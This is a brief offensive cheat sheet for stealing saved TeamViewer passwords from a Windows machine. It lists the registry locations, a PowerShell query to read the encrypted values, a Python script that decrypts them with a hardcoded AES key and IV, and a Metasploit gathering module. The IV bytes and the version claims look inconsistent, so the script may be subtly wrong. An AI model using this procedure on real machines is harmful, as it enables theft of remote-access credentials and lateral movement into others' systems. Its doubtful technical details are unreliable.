# TeamViewer Registry Credential Extraction

TeamViewer stores encrypted passwords in the Windows registry. The encryption uses a hardcoded AES key/IV, so stored credentials can be fully decrypted.

## Registry Locations
```
HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7
HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version8
HKLM\SOFTWARE\TeamViewer
```

Keys to look for:
- `SecurityPasswordAES`
- `OptionsPasswordAES`
- `ServerPasswordAES`
- `ProxyPasswordAES`

## Extract via PowerShell
```powershell
Get-ItemProperty -Path 'HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7' | Select-Object SecurityPasswordAES, OptionsPasswordAES
```

## Decrypt (Python)
TeamViewer uses AES-128-CBC with hardcoded key and IV:
```python
from Crypto.Cipher import AES
import binascii

key = bytes([0x06, 0x02, 0x00, 0x00, 0x00, 0xa4, 0x00, 0x00, 0x52, 0x53, 0x41, 0x31, 0x00, 0x04, 0x00, 0x00])
iv  = bytes([0x01, 0x00, 0x01, 0x00, 0x67, 0x24, 0x4f, 0x43, 0x6e, 0x67, 0x62, 0x46, 0x64, 0x61, 0x38, 0x0a])

enc = bytes.fromhex('<hex_value_from_registry>')
cipher = AES.new(key, AES.MODE_CBC, iv)
print(cipher.decrypt(enc).rstrip(b'\x00').decode('utf-16-le'))
```

## Metasploit Module
```
use post/windows/gather/credentials/teamviewer_passwords
```

## Notes
- Affects TeamViewer versions 7 and earlier (key/IV documented publicly)
- Run as SYSTEM or admin to read HKLM keys
